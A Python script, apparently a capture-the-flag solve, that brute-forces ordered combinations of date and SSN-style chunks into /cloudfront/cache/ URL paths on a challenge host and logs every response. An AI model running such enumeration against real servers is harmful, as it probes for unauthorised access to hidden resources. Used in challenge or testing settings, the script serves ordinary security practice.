import itertools
import requests

# Input: 4 UUIDs

# === USER CONFIGURATION ===
base_url = "https://target-flask.chals.io" 
hex_chunks = [
    '1969','07','22',
    '417-61-2282'
] 

# More hex chunks options if needed
# hex_chunks = [
#     '1969-07-22','07-22','1969','07','22',
#     '417-61-2282','417612282','2282','417','61'
# ] 

output_file = "cloudfront_results.txt"
timeout = 5  # Seconds to wait for each request

# === MAIN LOGIC ===
def main():
    combos = list(itertools.permutations(hex_chunks, 4))  # Ensure unique chunks per UUID
    total_combos = len(combos)
    count = 0
    print(f"Total combinations: {total_combos}")

    with open(output_file, "w", encoding="utf-8") as out:
        for uuid1, uuid2, uuid3, uuid4 in combos:
            url = f"{base_url}/cloudfront/cache/{uuid1}/{uuid2}/{uuid3}/{uuid4}"
            count += 1
            print(f"[{count}] Testing: {url}")

            try:
                response = requests.get(url, timeout=timeout)
                result = f"URL: {url}\nStatus: {response.status_code}\nResponse: {response.text}\n"
                print(f" → Status: {response.status_code}")
                if response.status_code == 200:
                    print(" → ✅ Success")
            except requests.RequestException as e:
                result = f"URL: {url} | ERROR: {str(e)}"

            out.write(result + "\n")

    print(f"Finished testing. Results saved to {output_file}")

if __name__ == "__main__":
    main()
